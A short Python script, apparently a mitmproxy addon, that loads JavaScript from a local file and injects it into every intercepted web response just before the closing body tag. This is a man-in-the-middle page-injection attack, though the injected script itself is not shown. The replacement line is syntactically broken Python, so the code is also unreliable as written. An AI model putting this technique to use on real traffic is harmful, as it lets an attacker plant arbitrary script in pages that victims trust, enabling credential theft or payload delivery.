import mitmproxy


with open("java.txt","r") as dosya:
	java_script=dosya.read()
def response(flow):
    flow.response.text = flow.response.text.replace("</body>",{java_script} "</body>")
